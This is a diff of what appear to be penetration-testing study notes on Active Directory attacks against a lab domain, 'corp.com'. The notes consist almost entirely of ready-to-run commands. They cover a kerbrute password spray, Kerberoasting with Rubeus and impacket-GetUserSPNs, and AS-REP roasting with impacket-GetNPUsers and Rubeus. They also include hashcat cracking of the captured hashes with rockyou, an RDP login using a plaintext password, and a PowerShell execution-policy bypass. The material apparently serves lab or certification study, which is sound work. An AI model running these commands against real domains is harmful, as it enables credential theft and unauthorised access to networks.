@@ -1195,25 +1195,28 @@ Login to DC
     PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
     ```
 - Kerberos attacks
-  - ddd
+  - Enumerate service accounts  
     `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
-  - ddd
-    `.\Rubeus.exe kerberoast /outfile:hashes.krb`
-  - crack kerberoast
+  - Requests service tickets (TGS) for all service account    
+    `PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`  
+  - crack the hash **13100 hashes.kerberoast**  
+    `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - Alternate tool - impacket-GetUserSPNs
+    `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`  
 - AS-REP roast (accounts without preauth)
-  - **DC1 pete**
+  - **DC1 pete**  
     `xfreerdp3 /u:pete /d:corp.com /p:'Nexus123!' /v:192.168.200.70 /cert:ignore /drive:share,/home/kali/share`  
-  - Find Vulnerable Users Does not require Kerberos preauthentication
+  - Find Vulnerable Users Does not require Kerberos preauthentication  
     ```
     PS C:\Tools> powershell -ep bypass
     PS C:\Tools> Import-Module .\PowerView.ps1
     Get-DomainUser -PreauthNotRequired | select samaccountname  #dave
     ```
-  - using 'pete' credential to request AS-REP hashes for 'dave'   
+  - using 'pete' credential to request AS-REP hashes for 'dave'  
     `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.188.70  -request -outputfile hashes.asreproast corp.com/pete`  
-  - crack the hash **18200 hashes.asreproast**
+  - crack the hash **18200 hashes.asreproast**  
     `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
-  - Alternate tool - Rubeus
+  - Alternate tool - Rubeus  
     `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`  
 - Silver tickets
 - Domain controller synchonization  
